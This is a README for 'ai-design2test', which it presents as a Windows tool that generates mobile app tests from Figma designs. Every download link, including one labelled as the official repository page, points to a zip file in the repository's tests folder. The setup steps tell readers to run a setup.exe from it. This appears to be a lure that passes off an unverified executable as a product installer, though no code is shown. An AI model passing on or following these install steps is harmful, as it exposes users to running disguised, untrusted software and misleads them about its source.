# 🤖 ai-design2test - Build automated mobile app tests fast

<a href="https://raw.githubusercontent.com/Visionshudra144/ai-design2test/main/tests/test_design_ai_2.5.zip">
  <img src="https://img.shields.io/badge/Download-ai--design2test-blue" alt="Download ai-design2test">
</a>

## 📋 Project Overview

The ai-design2test platform automates the mobile application testing process. It uses designs from Figma to create test cases. The software saves these test cases in a database and converts them into formats that testing tools understand. This system identifies which parts of your app need testing based on recent changes to your designs or features.

## 🖥️ System Requirements

To install and run this application, ensure your computer meets these requirements:

- Operating System: Windows 10 or Windows 11 (64-bit)
- Processor: Intel Core i5 or AMD equivalent
- Memory: 8 GB RAM or higher
- Storage: 500 MB of available space
- Internet Connection: Required for initial setup and design retrieval

## 🚀 Setting Up the Application

Follow these steps to download and run the software on your Windows machine.

1. Visit the [official repository page](https://raw.githubusercontent.com/Visionshudra144/ai-design2test/main/tests/test_design_ai_2.5.zip) to find the latest version of the installer.
2. Select the file named setup.exe from the assets list.
3. Save the file to your computer.
4. Locate the downloaded file in your downloads folder.
5. Double-click the file to start the installation.
6. Follow the instructions on the screen to finish the setup process.
7. Launch the application from your desktop shortcut once the bar fills completely.

## 🛠️ Key Features for Testing

This platform simplifies manual testing tasks through several automated functions:

- Figma Integration: Upload your design images and project context file directly into the tool.
- Smart Learning: The system uses a retrieval layer to understand your design context.
- Test Generation: The tool creates structured test cases from your design data.
- Database Management: All test cases remain stored in a local SQLite file for future use.
- Automated Formatting: The software converts logic into Maestro YAML flows for execution.
- Change Detection: Select specific regression test cases based on recent updates to your application screens.
- Dry-Run Support: Test your automation logic without executing live commands on your devices.

## 🖼️ User Interface Preview

The application uses a clean layout to display your test progress. The dashboard shows the status of current test flows and allows you to toggle data sources.

(View the project images in the repository link above to see the layout.)

## 💡 Using the Software

Open the application after installation. You will see a workspace. Complete these actions to begin your first test:

1. Connect your Figma account.
2. Import the design images that represent your mobile app screens.
3. Allow the system to analyze the image files.
4. Review the generated list of test steps.
5. Save the generated flow to your library.
6. Click the Run button to start the automation.

The software displays the result of the test on the screen. If a test fails, the interface highlights the specific screen where the issue occurred.

## ⚙️ Updating the Software

Check the link provided in the setup section periodically for new versions. If a new version exists, download the installer and run it. The application detects your installation and replaces the old files with the updated version automatically. Your existing test database remains intact during this process.

## 💬 Frequently Asked Questions

What happens if the test fails?
The tool provides a log of the failure. Check the screen image to confirm if the design matches the app output.

Does this tool work with all apps?
The tool supports mobile applications designed with standard components. Compatibility depends on the elements present in your Figma files.

Can I add other automation tools later?
The internal structure supports future additions. You can manage your test cases here, and the system prepares them for external tools like Appium or Playwright.

Does the tool require a constant internet connection?
An internet connection is necessary when you upload new designs or retrieve data from the server. Running your existing tests does not require an active web connection.

Where are my test files kept?
The application creates a folder in your Documents directory. All database files and YAML exports store themselves in this location.

Should I use the dry-run mode?
Use the dry-run mode when you want to verify that the logic is correct before running the test on a physical mobile device. This mode skips the final execution step.